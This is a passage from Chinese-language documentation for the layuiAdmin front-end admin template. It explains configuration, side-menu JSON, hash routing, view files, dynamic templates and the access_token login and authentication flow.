<li><code>dist/</code>: 通过 gulp 将 layuiAdmin src 目录的源代码进行构建后生成的目录（即：将 JS 和 CSS 文件进行了压缩等处理），通常用于线上环境。关于 gulp 的使用，下文也有介绍。</li>
<li><code>start/</code>: 存放 layuiAdmin 的入口页面、模拟接口数据、layui</li>
</ul>
<h4 id="宿主页面"><a href="#宿主页面" class="headerlink" title="宿主页面"></a>宿主页面</h4><p>你所看到的 start/index.html 是我们提供好的宿主页面，它是整个单页面的承载，所有的界面都是在这一个页面中完成跳转和渲染的。事实上，宿主页面可以放在任何地方，但是要注意修改里面的 &lt;link&gt; &lt;script&gt; 的 src 和 layui.config 中 base 的路径。</p>
<h4 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h4><p>当你已经顺利在本地预览了 layuiAdmin 后，你一定迫不及待关注更深层的结构。打开 src 目录，你将看到 config.js，里面存储着所有的默认配置。你可以按照实际需求选择性修改，下面是 layuiAdmin 默认提供的配置：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">layui.define([<span class="string">'laytpl'</span>, <span class="string">'layer'</span>, <span class="string">'element'</span>, <span class="string">'util'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">exports</span>)</span>&#123;</span><br><span class="line">  exports(<span class="string">'setter'</span>, &#123;</span><br><span class="line">    container: <span class="string">'LAY_app'</span> <span class="comment">//容器ID</span></span><br><span class="line">    ,<span class="attr">base</span>: layui.cache.base <span class="comment">//记录layuiAdmin文件夹所在路径</span></span><br><span class="line">    ,<span class="attr">views</span>: layui.cache.base + <span class="string">'views/'</span> <span class="comment">//视图所在目录</span></span><br><span class="line">    ,<span class="attr">entry</span>: <span class="string">'index'</span> <span class="comment">//默认视图文件名</span></span><br><span class="line">    ,<span class="attr">engine</span>: <span class="string">'.html'</span> <span class="comment">//视图文件后缀名</span></span><br><span class="line">    ,<span class="attr">pageTabs</span>: <span class="literal">false</span> <span class="comment">//是否开启页面选项卡功能。单页版不推荐开启</span></span><br><span class="line">    </span><br><span class="line">    ,<span class="attr">name</span>: <span class="string">'layuiAdmin Pro'</span></span><br><span class="line">    ,<span class="attr">tableName</span>: <span class="string">'layuiAdmin'</span> <span class="comment">//本地存储表名</span></span><br><span class="line">    ,<span class="attr">MOD_NAME</span>: <span class="string">'admin'</span> <span class="comment">//模块事件名</span></span><br><span class="line">    </span><br><span class="line">    ,<span class="attr">debug</span>: <span class="literal">true</span> <span class="comment">//是否开启调试模式。如开启，接口异常时会抛出异常 URL 等信息</span></span><br><span class="line">    </span><br><span class="line">    ,<span class="attr">interceptor</span>: <span class="literal">false</span> <span class="comment">//是否开启未登入拦截</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//自定义请求字段</span></span><br><span class="line">    ,<span class="attr">request</span>: &#123;</span><br><span class="line">      tokenName: <span class="string">'access_token'</span> <span class="comment">//自动携带 token 的字段名。可设置 false 不携带。</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//自定义响应字段</span></span><br><span class="line">    ,<span class="attr">response</span>: &#123;</span><br><span class="line">      statusName: <span class="string">'code'</span> <span class="comment">//数据状态的字段名称</span></span><br><span class="line">      ,<span class="attr">statusCode</span>: &#123;</span><br><span class="line">        ok: <span class="number">0</span> <span class="comment">//数据状态一切正常的状态码</span></span><br><span class="line">        ,<span class="attr">logout</span>: <span class="number">1001</span> <span class="comment">//登录状态失效的状态码</span></span><br><span class="line">      &#125;</span><br><span class="line">      ,<span class="attr">msgName</span>: <span class="string">'msg'</span> <span class="comment">//状态信息的字段名称</span></span><br><span class="line">      ,<span class="attr">dataName</span>: <span class="string">'data'</span> <span class="comment">//数据详情的字段名称</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//独立页面路由，可随意添加（无需写参数）</span></span><br><span class="line">    ,<span class="attr">indPage</span>: [</span><br><span class="line">      <span class="string">'/user/login'</span> <span class="comment">//登入页</span></span><br><span class="line">      ,<span class="string">'/user/reg'</span> <span class="comment">//注册页</span></span><br><span class="line">      ,<span class="string">'/user/forget'</span> <span class="comment">//找回密码</span></span><br><span class="line">      ,<span class="string">'/template/tips/test'</span> <span class="comment">//独立页的一个测试 demo</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//扩展的第三方模块</span></span><br><span class="line">    ,<span class="attr">extend</span>: [</span><br><span class="line">      <span class="string">'echarts'</span>, <span class="comment">//echarts 核心包</span></span><br><span class="line">      <span class="string">'echartsTheme'</span> <span class="comment">//echarts 主题</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//主题配置</span></span><br><span class="line">    ,<span class="attr">theme</span>: &#123;</span><br><span class="line">      <span class="comment">//配色方案，如果用户未设置主题，第一个将作为默认</span></span><br><span class="line">      color: [&#123;</span><br><span class="line">        main: <span class="string">'#20222A'</span> <span class="comment">//主题色</span></span><br><span class="line">        ,<span class="attr">selected</span>: <span class="string">'#009688'</span> <span class="comment">//选中色</span></span><br><span class="line">        ,<span class="attr">logo</span>: <span class="string">''</span> <span class="comment">//logo区域背景色</span></span><br><span class="line">        ,<span class="attr">header</span>: <span class="string">''</span> <span class="comment">//头部区域背景色</span></span><br><span class="line">        ,<span class="attr">alias</span>: <span class="string">'default'</span> <span class="comment">//默认别名</span></span><br><span class="line">      &#125;] <span class="comment">//为了减少篇幅，更多主题此处不做列举，可直接参考 config.js</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">//初始的颜色索引，对应上面的配色方案数组索引</span></span><br><span class="line">      <span class="comment">//如果本地已经有主题色记录，则以本地记录为优先，除非清除 localStorage（步骤：F12呼出调试工具→Aplication→Local Storage→选中页面地址→layuiAdmin→再点上面的X）</span></span><br><span class="line">      <span class="comment">// 1.0 正式版开始新增</span></span><br><span class="line">      ,<span class="attr">initColorIndex</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="侧边菜单"><a href="#侧边菜单" class="headerlink" title="侧边菜单"></a>侧边菜单</h4><ul>
<li>在 start/json/menu.js 文件中，我们放置了默认的侧边菜单数据，你可以去随意改动它。</li>
<li>如果你需要动态加载菜单，你需要将 views/layout.html 中的对应地址改成你的真实接口地址<br>侧边菜单最多可支持到三级。无论你采用静态的菜单还是动态的，菜单的数据格式都必须是一段合法的 JSON，且必须符合以下规范： </li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"code"</span>: <span class="number">0</span>, <span class="comment">//状态码，key 名可以通过 config.js 去重新配置</span></span><br><span class="line">  <span class="string">"msg"</span>:<span class="string">""</span>, <span class="comment">//提示信息</span></span><br><span class="line">  <span class="string">"data"</span>: [&#123; <span class="comment">//菜单数据，key名可以通过 config.js 去重新配置</span></span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"component"</span>, <span class="comment">//一级菜单名称（与视图的文件夹名称和路由路径对应）</span></span><br><span class="line">    <span class="string">"title"</span>: <span class="string">"组件"</span>, <span class="comment">//一级菜单标题</span></span><br><span class="line">    <span class="string">"icon"</span>: <span class="string">"layui-icon-component"</span>, <span class="comment">//一级菜单图标样式</span></span><br><span class="line">    <span class="string">"jump"</span>: <span class="string">''</span> ,<span class="comment">//自定义一级菜单路由地址，默认按照 name 解析。一旦设置，将优先按照 jump 设定的路由跳转</span></span><br><span class="line">    <span class="string">"spread"</span>: <span class="literal">true</span> ,<span class="comment">//是否默认展子菜单（1.0.0-beta9 新增）</span></span><br><span class="line">    <span class="string">"list"</span>: [&#123; <span class="comment">//二级菜单</span></span><br><span class="line">      <span class="string">"name"</span>: <span class="string">"grid"</span>, <span class="comment">//二级菜单名称（与视图的文件夹名称和路由路径对应）</span></span><br><span class="line">      <span class="string">"title"</span>: <span class="string">"栅格"</span>, <span class="comment">//二级菜单标题</span></span><br><span class="line">      <span class="string">"jump"</span>: <span class="string">''</span>,  <span class="comment">//自定义二级菜单路由地址</span></span><br><span class="line">      <span class="string">"spread"</span>: <span class="literal">true</span>, <span class="comment">//是否默认展子菜单（1.0.0-beta9 新增）</span></span><br><span class="line">      <span class="string">"list"</span>: [&#123; <span class="comment">//三级菜单</span></span><br><span class="line">         <span class="string">"name"</span>: <span class="string">"list"</span>, <span class="comment">//三级菜单名（与视图中最终的文件名和路由对应），如：component/grid/list</span></span><br><span class="line">         <span class="string">"title"</span>: <span class="string">"等比例列表排列"</span> <span class="comment">//三级菜单标题</span></span><br><span class="line">        &#125;,&#123;</span><br><span class="line">         <span class="string">"name"</span>: <span class="string">"mobile"</span>,</span><br><span class="line">         <span class="string">"title"</span>: <span class="string">"按移动端排列"</span></span><br><span class="line">       &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>TIPS：实际运用时，切勿出现上述中的注释，否则将不是合法的 JSON ，会出现解析错误。</p>
</blockquote>
<p>需要注意的是以下几点：</p>
<ol>
<li>当任意级菜单有子菜单，点击该菜单都只是收缩和展开操作，而并不会跳转，只有没有子菜单的菜单才被允许跳转。</li>
<li>菜单的路由地址默认是按照菜单层级的 name 来设定的。<br>我们假设一级菜单的 name 是：a，二级菜单的是：b，三级菜单的 name 是 c，那么：<ul>
<li>三级菜单最终的路由地址就是：/a/b/c</li>
<li>如果二级菜单没有三级菜单，那么二级菜单就是最终路由，地址就是：/a/b/</li>
<li>如果一级菜单没有二级菜单，那么一级菜单就是最终路由，地址就是：/a/</li>
</ul>
</li>
<li>但如果你设置了 参数 jump，那么就会优先读取 jump 设定的路由地址，如：”jump”: “/user/set” </li>
</ol>
<h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>layuiAdmin 的路由是采用 <em>location.hash</em> 的机制，即路由地址是放在 <code>./#/</code> 后面，并通过 layui 自带的方法： <code>layui.router()</code> 来进行解析。每一个路由都对应一个真实存在的视图文件，且路由地址和视图文件的路径是一致的（相对 <em>views</em> 目录）。因此，你不再需要通过配置服务端的路由去访问一个页面，也无需在 layuiAdmin 内部代码中去定义路由，而是直接通过 layuiAdmin 的前端路由去访问，即可匹配相应目录的视图，从而呈现出页面结果。</p>
<h4 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./#/path1/path2/path3/key1=value1/key2=value2…</span><br></pre></td></tr></table></figure>

<p>一个实际的示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./#/user/set</span><br><span class="line">./#/user/set/uid=123/type=1#xxx（下面将以这个为例继续讲解）</span><br></pre></td></tr></table></figure>

<p>当你需要对路由结构进行解析时，你只需要通过 layui 内置的方法 <code>layui.router()</code> 即可完成。如上面的路由解析出来的结果是：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    path: [<span class="string">'user'</span>,<span class="string">'set'</span>]</span><br><span class="line">    ,<span class="attr">search</span>: &#123;<span class="attr">uid</span>: <span class="number">123</span>, <span class="attr">type</span>: <span class="number">1</span>&#125;</span><br><span class="line">    ,<span class="attr">href</span>: <span class="string">'user/set/uid=123/type=1'</span></span><br><span class="line">    ,<span class="attr">hash</span>: <span class="string">'xxx'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，不同的结构会自动归纳到相应的参数中，其中：</p>
<blockquote>
<ul>
<li>path：存储的是路由的目录结构</li>
<li>search：存储的是路由的参数部分</li>
<li>href：存储的是 layuiAdmin 的完整路由地址</li>
<li>hash：存储的是 layuiAdmin 自身的锚记，跟系统自带的 <code>location.hash</code> 有点类似</li>
</ul>
</blockquote>
<p>通过 <code>layui.router()</code> 得到路由对象后，你就可以对页面进行个性化操作、异步参数传值等等。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在 JS 中获取路由参数</span></span><br><span class="line"><span class="keyword">var</span> router = layui.router();</span><br><span class="line">admin.req(&#123;</span><br><span class="line">url: <span class="string">'xxx'</span></span><br><span class="line">,<span class="attr">data</span>: &#123;</span><br><span class="line">    uid: router.search.uid</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!--  在动态模板中获取路由参数 --&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/html"</span> template lay-url=<span class="string">"./xxx/?uid=&#123;&#123; layui.router().search.uid &#125;&#125;"</span>&gt;</span><br><span class="line">…</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;!-- 或 --&gt;</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>html<span class="string">" template lay-url="</span>./xxx/<span class="string">" lay-data="</span>&#123;<span class="attr">uid</span>:<span class="string">'&#123;&#123; layui.router().search.uid &#125;&#125;'</span>&#125;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">…</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="路由跳转"><a href="#路由跳转" class="headerlink" title="路由跳转"></a>路由跳转</h4><p>通过上文的路由规则，你已经大致清楚了 layuiAdmin 路由的基本原理和解析方法。那么如何完成路由的跳转呢？</p>
<ol>
<li>在视图文件的 HTML 代码中，通过对任意元素设定 <code>lay-href=&quot;/user/set/uid=123/type=1&quot;</code> ，<strong>好处是</strong>：任意元素都可以触发跳转。<strong>缺点是</strong>：只能在浏览器当前选项卡完成跳转（注意：不是 layuiAdmin 的选项卡）</li>
<li>直接对 a 标签设定 href，如： <code>&lt;a href=&quot;#/user/set&quot;&gt;text&lt;/a&gt;</code> 。<strong>好处是</strong>：你可以通过设定 <code>target=&quot;_blank&quot;</code> 来打开一个浏览器新选项卡。<strong>缺点是</strong>：只能设置 <code>a</code> 标签，且前面必须加 <code>/#/</code></li>
<li>在 JS 代码中，还可通过 <code>location.hash = &#39;/user/set&#39;;</code> 来跳转。前面无需加 <code>#</code>，它会自动追加。</li>
</ol>
<h4 id="路由结尾"><a href="#路由结尾" class="headerlink" title="路由结尾"></a>路由结尾</h4><p>在路由结尾部分出现的 <code>/</code> 与不出现，是两个完全不同的路由。比如下面这个：</p>
<ol>
<li>user/set<br>读取的视图文件是：.views/user/set.html</li>
<li>user/set/<br>读取的视图文件是：./views/user/set/index.html （TIPS：这里的  index.html 即是目录下的默认主视图，下文会有讲解）</li>
</ol>
<p>因此一定要注意结尾处的 <code>/</code>，避免视图读取错误。</p>
<h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><p>这或许是你应用 layuiAdmin 时的主要焦点，在开发过程中，你的大部分精力都可能会聚焦在这里。它取代了服务端 MVC 架构中的 <em>view</em> 层，使得应用开发变得更具扩展性。因此如果你采用 layuiAdmin 的 SPA（单页应用）模式，请务必要抛弃服务端渲染视图的思想，让页面的控制权限重新回归到前端吧！</p>
<blockquote>
<p><strong>views</strong> 目录存放的正是视图文件，你可以在该目录添加任意的新目录和新文件，通过对应的路由即可访问。</p>
</blockquote>
<p>注意：如果是单页面模式，视图文件通常是一段 HTML 碎片，而不能是一个完整的 html 代码结构。</p>
<h4 id="视图与路由的关系"><a href="#视图与路由的关系" class="headerlink" title="视图与路由的关系"></a>视图与路由的关系</h4><p>每一个视图文件，都对应一个路由。其中 <code>index.html</code> 是默认文件（你也可以通过 config.js 去重新定义）。视图文件的所在目录决定了路由的访问地址，如：</p>
<table>
<thead>
<tr>
<th align="left">视图路径</th>
<th align="left">对应的路由地址</th>
</tr>
</thead>
<tbody><tr>
<td align="left">./views/user/index.html</td>
<td align="left">/user/</td>
</tr>
<tr>
<td align="left">./views/user.html</td>
<td align="left">/user</td>
</tr>
<tr>
<td align="left">./views/user/set/index.html</td>
<td align="left">/user/set/</td>
</tr>
<tr>
<td align="left">./views/user/set.html</td>
<td align="left">/user/set</td>
</tr>
<tr>
<td align="left">./views/user/set/base.html</td>
<td align="left">/user/set/base</td>
</tr>
</tbody></table>
<p>通过上述的表格列举的对应关系，可以总结出：</p>
<ul>
<li>当视图文件是 index.html，那么路由地址就是它的上级目录（相对 _views_），以 <code>/</code> 结尾</li>
<li>当视图文件不是 index.html，那么路由地址就是它的上级目录+视图文件名，不以 <code>/</code> 结尾</li>
</ul>
<blockquote>
<p>值得注意的是：路由路径并非最多只能三级，它可以无限极。但对应的视图也必须存放在相应的层级目录下</p>
</blockquote>
<h4 id="视图中加载-JS-模块"><a href="#视图中加载-JS-模块" class="headerlink" title="视图中加载 JS 模块"></a>视图中加载 JS 模块</h4><p>在视图文件中，除了写 HTML，也可以写 JavaScript 代码。如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">“LAY-demo-hello”</span>&gt;</span>Hello layuiAdmin<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">layui.use(<span class="string">'admin'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> $ = layui.jquery;</span></span><br><span class="line">    admin.popup(&#123;</span><br><span class="line"><span class="javascript">        content: $(<span class="string">'#LAY-demo-hello'</span>).html()</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果该视图对应的 JS 代码量太大，我们更推荐你在  controller  目录下新增一个业务模块，并在视图中直接 layui.use 去加载该模块。下面以控制台主页 <code>index.html</code> 为例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>html区域<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">//加载 controller 目录下的对应模块</span></span></span><br><span class="line">/*</span><br><span class="line">小贴士：</span><br><span class="line"><span class="javascript">    这里 <span class="built_in">console</span> 模块对应 的 <span class="built_in">console</span>.js 并不会重复加载，</span></span><br><span class="line">    然而该页面的视图可能会重新插入到容器，那如何保证脚本能重新控制视图呢？有两种方式：</span><br><span class="line"><span class="javascript">    <span class="number">1</span>): 借助 layui.factory 方法获取 <span class="built_in">console</span> 模块的工厂（回调函数）给 layui.use</span></span><br><span class="line">    2): 直接在 layui.use 方法的回调中书写业务代码，即:</span><br><span class="line"><span class="javascript">        layui.use(<span class="string">'console'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span></span><br><span class="line"><span class="javascript">            <span class="comment">//同 console.js 中的 layui.define 回调中的代码 </span></span></span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">这里我们采用的是方式1。其它很多视图中采用的其实都是方式2，因为更简单些，也减少了一个请求数。</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"><span class="javascript">layui.use(<span class="string">'console'</span>, layui.factory(<span class="string">'console'</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当视图被渲染后，layui.factory 返回的函数也会被执行，从而保证在不重复加载 JS 模块文件的前提下，保证脚本能重复执行。</p>
<h3 id="动态模板"><a href="#动态模板" class="headerlink" title="动态模板"></a>动态模板</h3><p>layuiAdmin 的视图是一个“动静结合”的载体，除了常规的静态模板，你当然还可以在视图中存放动态模板，因此它可谓是焦点中的焦点。</p>
<h4 id="定义模板"><a href="#定义模板" class="headerlink" title="定义模板"></a>定义模板</h4><p>在视图文件中，通过下述规则定义模板：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/html"</span> template&gt;</span><br><span class="line">&lt;!-- 动态模板碎片 --&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面是一个简单的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/html"</span> template&gt;</span><br><span class="line">当前 layuiAdmin 的版本是：&#123;&#123; layui.admin.v &#125;&#125;</span><br><span class="line">路由地址：&#123;&#123; layui.router().href &#125;&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>在不对动态模板设定数据接口地址的情况下，它能读取到全局对象。但更多时候，一个动态模板应该是对应一个接口地址，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/html"</span> template lay-url=<span class="string">"接口地址"</span>&gt;</span><br><span class="line">    我叫：&#123;&#123; d.data.username &#125;&#125;</span><br><span class="line">    &#123;&#123;# if(d.data.sex === '男')&#123; &#125;&#125;</span><br><span class="line">        公的</span><br><span class="line">    &#123;&#123;# &#125; else &#123; &#125;&#125;</span><br><span class="line">        母的</span><br><span class="line">    &#123;&#123;# &#125; &#125;&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>模板中的 <code>d</code> 对应的是你接口返回的 json 转化后的一维对象，如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"data"</span>: &#123;</span><br><span class="line">      <span class="attr">"username"</span>: <span class="string">"贤心"</span>,</span><br><span class="line">      <span class="attr">"sex"</span>: <span class="string">"男"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>那么，上述动态模板最终输出的结果就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我叫：贤心</span><br><span class="line">公的</span><br></pre></td></tr></table></figure>



<h4 id="模板基础属性"><a href="#模板基础属性" class="headerlink" title="模板基础属性"></a>模板基础属性</h4><p>动态模板支持以下基础属性</p>
<ul>
<li><strong>lay-url</strong><br>用于绑定模板的数据接口地址，支持动态模板解析，如：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/html"</span> <span class="attr">template</span> <span class="attr">lay-url</span>=<span class="string">"https://api.xxx.com?id=&#123;&#123; layui.router().search.id &#125;&#125;"</span>&gt;</span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 动态模板碎片 --&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>lay-data</strong><br>用于定义接口请求的参数，其值是一个 JavaScript object 对象，同样支持动态模板解析，如：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/html"</span> <span class="attr">template</span> <span class="attr">lay-url</span>=<span class="string">""</span> <span class="attr">lay-data</span>=<span class="string">"&#123;id: '&#123;&#123; layui.router().search.id &#125;&#125;', type: 1&#125;"</span>&gt;</span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 动态模板碎片 --&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>lay-headers</strong><br>用户定义接口请求的 Request Headers 参数，用法与 lay-data 的完全类似，支持动态模板解析。</p>
</li>
<li><p><strong>lay-done</strong><br>接口请求完毕并完成视图渲染的回调脚本，里面支持写任意的 JavaScript 语句。事实上它是一个封闭的函数作用域，通过给 Function 实例返回的函数传递一个参数 <code>d</code>，用于得到接口返回的数据：</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/html"</span> <span class="attr">template</span> <span class="attr">lay-url</span>=<span class="string">""</span> <span class="attr">lay-done</span>=<span class="string">"console.log(d);"</span>&gt;</span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 动态模板碎片 --&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>很多时候，你在动态模板中可能会放入一些类似于 layui 的 form 元素，而有些控件需要执行 <code>form.render()</code> 才会显示，这时，你可以对 lay-done 赋值一个全局函数，如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/html"</span> <span class="attr">template</span> <span class="attr">lay-url</span>=<span class="string">""</span> <span class="attr">lay-done</span>=<span class="string">"layui.data.done(d);"</span>&gt;</span></span><br><span class="line"><span class="javascript">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"layui-form"</span> lay-filter=<span class="string">"LAY-filter-demo-form"</span>&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">title</span>=<span class="string">"复选框"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  注意：别看眼花了，下面可不是动态模板，而是 JS 脚本区域 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">layui.data.done = <span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    layui.use([<span class="string">'form'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> form = layui.form;</span></span><br><span class="line"><span class="javascript">        form.render(<span class="literal">null</span>, <span class="string">'LAY-filter-demo-form'</span>); <span class="comment">//渲染该模板下的动态表单</span></span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>TIPS：</p>
<blockquote>
<ul>
<li>如果模板渲染完毕需要处理过多的交互，我们强烈推荐你采用上述的方式定义一个全局函数赋值给 lay-done，会极大地减少维护成本。</li>
<li>无需担心该全局函数的冲突问题，该函数是一次性的。其它页面即便声明了一个同样的函数，也只是用于新的视图，丝毫不会对之前的视图造成任何影响。</li>
<li>layui.data.done 中的 <em>done</em> 可以随意命名，但需与 lay-done 的赋值对应上。</li>
</ul>
</blockquote>
<h4 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h4><p>动态模板基于 layui 的 laytpl 模块，详细语法可见：  <a href="http://www.layui.com/doc/modules/laytpl.html#syntax" target="_blank" rel="noopener">传送门</a></p>
<h3 id="登录与接口鉴权"><a href="#登录与接口鉴权" class="headerlink" title="登录与接口鉴权"></a>登录与接口鉴权</h3><p>由于 layuiAdmin 接管了视图层，所以不必避免可能会与服务端分开部署，这时你有必要了解一下 layuiAdmin 默认提供的：从 <em>登录</em> 到 <em>接口鉴权</em> ，再到 <em>注销</em> 的整个流程。</p>
<h4 id="登录拦截器"><a href="#登录拦截器" class="headerlink" title="登录拦截器"></a>登录拦截器</h4><p>进入登入页面登入成功后，会在 localStorage 的本地表中写入一个字段。如： access_token （名称可以在 config.js 自定义）。拦截器判断没有 access_token 时，则会跳转到登入页。尽管可以通过伪造一个假的 access_token 绕过视图层的拦截，但在请求接口时，会自动带上 access_token，服务端应再次做一层校验。</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ol>
<li>打开 <code>config.js</code> ，将 <code>interceptor</code> 参数设置为 <code>true</code>（该参数为 1.0.0-beta6 开始新增）。那么，当其未检查到 <code>access_token</code> 值时，会强制跳转到登录页面，以获取 access_token。</li>
<li>打开登录对应的视图文件 <code>views/user/login.html</code>，在代码最下面，你将看到一段已经写好的代码，你需要的是将接口地址改为服务端的真实接口，并返回 <code>access_token</code> 值。</li>
<li>layuiAdmin 会将服务端返回的 <code>access_token</code> 值进行本地存储，这时你会发现 layuiAdmin 不再强制跳转到登录页面。并在后面每次请求服务端接口时，都会自动在参数和 Request Headers 中带上 <code>access_token</code>，以便服务端进行鉴权。</li>
<li>若鉴权成功，顺利返回数据；若鉴权失败，服务端的 <code>code</code> 应返回 <code>1001</code>（可在 config.js 自定义） ， layuiAdmin 将会自动清空本地无效 token 并跳转到登入页。</li>
<li>退出登录：重新打开 <code>controller/common.js</code>，搜索 <code>logout</code>，配上注销接口即可。</li>
</ol>
<blockquote>
<p>如果是在其它场景请求的接口（如：table.render()），那么你需要获取本地存储的 token 复制给接口参数，如：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">table.render(&#123;</span><br><span class="line">    elem: <span class="string">'#xxxx'</span></span><br><span class="line">    ,<span class="attr">url</span>: <span class="string">'url'</span></span><br><span class="line">    ,<span class="attr">where</span>: &#123;</span><br><span class="line">        access_token: layui.data(<span class="string">'layuiAdmin'</span>).access_token</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


